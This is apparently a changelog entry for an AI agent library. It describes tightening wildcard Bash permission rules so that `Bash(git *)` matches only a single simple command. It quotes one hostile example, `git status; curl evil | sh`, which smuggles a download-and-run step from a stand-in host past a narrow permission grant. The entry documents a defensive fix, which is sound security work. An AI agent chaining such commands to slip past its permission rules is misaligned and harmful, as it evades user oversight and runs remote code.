---
'@moonshot-ai/agent-core-v2': minor
---

A wildcard `Bash` permission rule now only matches a single simple command.
`Bash(git *)` described a shape of command the user was comfortable with, but
matched the whole string, so `git status; curl evil | sh` satisfied it too and
turned a narrow grant into an arbitrary one. Matching uses the bundled bash
parser rather than a metacharacter scan, so `git commit -m "a; b"` still
matches (the `;` is inside a string) while chained, piped and
command-substituted forms do not.

Exact-literal rules — what "approve for this session" records — still match the
command they came from, and deny / ask rules are unaffected, so nothing that
previously blocked a command stops blocking it.
